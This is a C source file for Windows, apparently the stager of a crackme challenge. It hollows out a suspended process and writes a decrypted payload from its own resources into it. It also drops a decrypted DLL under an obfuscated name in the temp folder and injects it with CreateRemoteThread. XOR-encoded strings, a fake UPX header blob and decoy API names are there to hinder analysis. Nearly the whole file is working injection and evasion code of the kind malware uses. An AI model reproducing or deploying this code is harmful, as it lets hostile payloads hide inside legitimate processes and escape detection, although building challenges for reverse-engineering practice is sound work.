#include <windows.h>
#include <psapi.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>
#include <winternl.h>
// uncomment to make it print errors
//#define DEBUG
#define MYERR while(1){ printf("ERROR! %d\n",GetLastError());Sleep(1000);break;}
#define SIZE_EXE 1278976
CONTEXT ctx;
typedef __int64 QWORD;

typedef LONG( WINAPI * NtUnmapViewOfSection )(HANDLE ProcessHandle, PVOID BaseAddress);
NtUnmapViewOfSection NtUnmapViewOfSection_fun;

char upx_cmnt[] = "\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20\x6d\x6f\x64\x65\x2e\x0a\x0a\x24\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x64\x86\x03\x00\xd0\xfc\xd1\x5f\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x2f\x02\x0b\x02\x02\x1e\x00\xa0\x09\x00\x00\xa0\x02\x00\x00\xa0\x0a\x00\x80\x44\x17\x00\x00\xb0\x0a\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x02\x00\x00\x00\x00\x00\x00\xf0\x19\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xe9\x19\x00\xd0\x00\x00\x00\x00\x50\x17\x00\x80\x99\x02\x00\x00\x60\x00\x00\x94\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\xea\x19\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x46\x17\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\x50\x58\x30\x00\x00\x00\x00\x00\xa0\x0a\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\xe0\x55\x50\x58\x31\x00\x00\x00\x00\x00\xa0\x09\x00\x00\xb0\x0a\x00\x00\x98\x09\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\xe0\x2e\x72\x73\x72\x63\x00\x00\x00\x00\xa0\x02\x00\x00\x50\x17\x00\x00\x9c\x02\x00\x00\x9a\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\xc0\x33\x2e\x39\x36\x00\x55\x50\x58\x21\x0a\x24\x08\x07\x92\x21\xec\x60\xed\x1d\x1b\xda\xba\x26\x17\x00\x56\x94\x09\x00\x00\xb6\x16\x00\x49\x02\x00\x62\xef\xdf\x6d\xff\xc3\x0f\x1f\x44\x00\x00\x66\x2e\x0c\x84\x00\x01\x48\x83\xec\x28\x48\x8b\x05\xa5\x28\x31\x72\xec\xbc\xf3\xc9\xc7\x00\x01\x1c\xa6\x19\xa9\xff\x3b\x20\x03\x6c\x4f\x43\x94\x81\x38\x4d\x5a\x75\x0f\x48\x7f\xde\xb6\xfd\x63\x50\x3c\x48\x01\xd0\x18\x50\x45\x26\x74\x59\x52\x32\x89\x0a\x98\x6f\xf6\x7d\xf7\x37\x8b\x00\x85\xc0\x75\x36\xb9\x69\xe8\x02\x00\x24";

char zero_bytes1[488] = { 0 };
char deflate_cmnt[] = "deflate 1.2.11 Copyright 1995-2017 Jean-loup Gailly and Mark Adler";
char zero_bytes2[129] = { 0 };
char* fake_funs[] = { "aesCTSEncryptMsg", "EfsDllDecryptFek", "SpDecryptMessage", "NtLoadKey", "CreateServiceA", "DeviceIoControl" };
char* dll_names[] = { "Ntdll", "Kernel32", "Kernelbase", "User32", "Gdi32", "Imm32" };
char zero_bytes3[260] = { 0 };
char* keys[] = { "SQSG1RLVMFKS+ZBOl5hiHw==", "52WaenwoQv0QET/fwtl4+w==" };

DWORD load_res(LPCSTR res_id, PVOID* out)
{
	HRSRC res = FindResourceA(NULL, res_id, MAKEINTRESOURCE(10));
	*out = LoadResource(NULL, res);
	return SizeofResource(NULL, res);
}

DWORD load_stage(PVOID res)
{
	char name[9];
	for (int i = 0; i < 8; i++) name[i] = dll_names[1][i];
	name[8] = 0;
	name[5] ^= ('l' ^ '1');
	return load_res(name, res);
}

DWORD load_dll(PVOID res)
{
	char name[9];
	for (int i = 0; i < 8; i++) name[i] = dll_names[1][i];
	name[8] = 0;
	return load_res(name, res);
}

int main(int argc, char* argv[], char* envp[])
{
	char dll_filename[64];
	char process_path[] = "\xCC\xB5\xD3\xD8\xE6\xE1\xEB\xE0\xF8\xFC\xD3\xEA\xF7\xFF\xE3\xE0\xFD\xEA\xFD\xA1\xEA\xF7\xEA";
	srand(time(NULL));
	PEB peb;
	STARTUPINFOA startinfo;
	memset(&startinfo, 0, sizeof(startinfo));
	startinfo.cb = sizeof(startinfo);
	PROCESS_INFORMATION processinfo;
	memset(&processinfo, 0, sizeof(processinfo));
	for (int i = 0; i < sizeof(process_path)-1; i++)
		process_path[i] ^= 0x8f;
	if (!CreateProcess(/*"C:\\Windows\\System32\\calc.exe"*/process_path, "", NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &startinfo, &processinfo))
	{
#ifdef DEBUG
		printf("[-] CreateProcess\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	//HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processinfo.dwProcessId);
	ctx.ContextFlags = CONTEXT_FULL;
#ifdef DEBUG
	printf("hprocess=%p\n",processinfo.hProcess);
#endif
	if (!GetThreadContext(processinfo.hThread, &ctx))
	{
#ifdef DEBUG
		printf("[-] GetThreadContext\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	PVOID imagebase;
#ifdef DEBUG
	printf("PEB = %p\n", ctx.Rdx);
#endif
	if (!ReadProcessMemory(processinfo.hProcess, (LPCVOID) ctx.Rdx, (LPVOID)&peb, sizeof(peb), NULL))
	{
#ifdef DEBUG
		printf("[-] ReadProcessMemory imagebase\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	imagebase = peb.Reserved3[1];
#ifdef DEBUG
	printf("[+] main module = %p\n", imagebase);
#endif
	NtUnmapViewOfSection_fun = (NtUnmapViewOfSection) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection");
#ifdef DEBUG
	printf("[+] NtUnmapViewOfSection = %p\n", NtUnmapViewOfSection_fun);
	printf("Imagebase at %p\n", imagebase);
#endif
	LPSTR mem;//loadfile("C:\\Users\\Redouane\\Desktop\\Work\\infosec\\megacrackme\\crackme.exe");
	int size_stage = load_stage(&mem);
	for (int i = 0; i < size_stage; i++)
	{
		mem[i] = (mem[i] + 99) ^ 0x2f;
	}
#ifdef DEBUG
	printf("Loaded stage of size %u\n", size_stage);
#endif
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER) mem;
	PIMAGE_NT_HEADERS64 nt_header = (PIMAGE_NT_HEADERS64) ((__int64)mem + dos_header->e_lfanew);
#ifdef DEBUG
	printf("[?] Number of sections : %d\n", nt_header->FileHeader.NumberOfSections);
#endif
	if (imagebase == nt_header->OptionalHeader.ImageBase)
		if (NtUnmapViewOfSection_fun(processinfo.hProcess, (PVOID)imagebase))
		{
#ifdef DEBUG
		  printf("[-] NtUnmapViewOfSection\n");
		  MYERR;
#endif
		  ExitProcess(1);
		}
#ifdef DEBUG
	printf("sizeof(image) = %p\n", nt_header->OptionalHeader.SizeOfImage);
	printf("? imagebase = %p\n", imagebase);
#endif
	LPVOID new_imagebase = VirtualAllocEx(
		processinfo.hProcess,
		(PVOID)nt_header->OptionalHeader.ImageBase,
		nt_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (new_imagebase == NULL)
	{
#ifdef DEBUG
		printf("[-] VirtualAllocEx imagebase\n");
		MYERR;
#endif
		ExitProcess(1);
	}
#ifdef DEBUG
	printf("[?] new_imagebase = %p\n", new_imagebase);
#endif
	if (!WriteProcessMemory(processinfo.hProcess, new_imagebase, mem, nt_header->OptionalHeader.SizeOfHeaders, NULL))
	{
#ifdef DEBUG
		printf("[-] WriteProcessMemory headers\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER section_header = (PIMAGE_SECTION_HEADER) ((__int64)mem + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));
		//printf("[?] section : %s\nVirtualAddress : 0x%x\nRaw size : %x\nPointer to raw data : %p\n", section_header->Name, section_header->VirtualAddress, section_header->SizeOfRawData, section_header->PointerToRawData);
		if (!WriteProcessMemory(processinfo.hProcess, new_imagebase+section_header->VirtualAddress, (LPVOID)((__int64)mem+section_header->PointerToRawData), section_header->SizeOfRawData, NULL))
		{
#ifdef DEBUG
			printf("[-] WriteProcessMemory section\n");
			MYERR;
#endif
			ExitProcess(1);
		}
	}
	if (!WriteProcessMemory(processinfo.hProcess, (LPVOID)ctx.Rdx+0x10, &new_imagebase, 8, NULL))
	{
#ifdef DEBUG
		printf("[-] WriteProcessMemory newimagebase\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	
	ctx.Rcx = /*nt_header->OptionalHeader.ImageBase*/(__int64)new_imagebase + nt_header->OptionalHeader.AddressOfEntryPoint;
    
    if (!SetThreadContext(processinfo.hThread, &ctx))
	{
#ifdef DEBUG
		printf("[-] SetThreadContext\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	
	if (ResumeThread(processinfo.hThread) == -1)
	{
#ifdef DEBUG
		printf("[-] ResumeThread\n");
		MYERR;
#endif
		ExitProcess(1);
	}

	// inject the dll
	char* dll;
	int dll_size = load_dll(&dll);
	
	for (int i = 0; i < dll_size; i++)
	{
		dll[i] = (dll[i] + 0x55) ^ 0xe3;
	}
	//printf("[+] loaded dll of size %u\n", dll_size);
	size_t temp_length = GetTempPathA(sizeof(dll_filename),dll_filename);
	*(uint32_t*)(dll_filename+temp_length) = 0x7547a457;
	*(uint32_t*)(dll_filename+temp_length) = (*(uint32_t*)(dll_filename+temp_length) << 12) | 0xa4d;
	*(uint32_t*)(dll_filename+temp_length+4) = 0x41557863;
	*(uint32_t*)(dll_filename+temp_length+4) = (*(uint32_t*)(dll_filename+temp_length+4) << 16) | 0x7a4d;
	*(uint32_t*)(dll_filename+temp_length+8) = 0x84ec6d5f;
	*(uint32_t*)(dll_filename+temp_length+8) ^= 0xe8800971;
	dll_filename[temp_length+12] = 0;
	//printf("[?] dll_filename = %s\n", dll_filename);
	OFSTRUCT fileofstruct;
	HANDLE dll_file = CreateFile(dll_filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (dll_file == INVALID_HANDLE_VALUE)
	{
#ifdef DEBUG
		printf("[-] CreateFile\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	//printf("dll_file = %p\n", dll_file);
	DWORD written_bytes;
	if (WriteFile(dll_file, dll, dll_size, &written_bytes, NULL) == 0)
	{
#ifdef DEBUG
		printf("[-] WriteFile\n");
		MYERR;
#endif
		ExitProcess(1);
    }
	CloseHandle(dll_file);
	LPVOID dllpath_addr = VirtualAllocEx(processinfo.hProcess, NULL, _MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!WriteProcessMemory(processinfo.hProcess, dllpath_addr, dll_filename, strlen(dll_filename)+1, NULL))
	{
#ifdef DEBUG
		printf("[-] WriteProcessMemory\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	LPVOID loadlibrary_addr = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (!loadlibrary_addr)
	{
#ifdef DEBUG
		printf("[-] GetProcAddress\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	HANDLE dllloader_handle = CreateRemoteThread(processinfo.hProcess, NULL, 0, loadlibrary_addr, dllpath_addr, 0, NULL);
	
	if (!dllloader_handle)
	{
#ifdef DEBUG
		printf("[-] CreateRemoteThread\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	
	/*
	if (WaitForSingleObject(dllloader_handle, 0) == -1)
	{
		printf("[-] WaitForSingleObject\n");
		MYERR;
		return -1;
	}
	*/
#ifdef DEBUG
	printf("Exiting normally\n");
#endif
	ExitProcess(0);
}
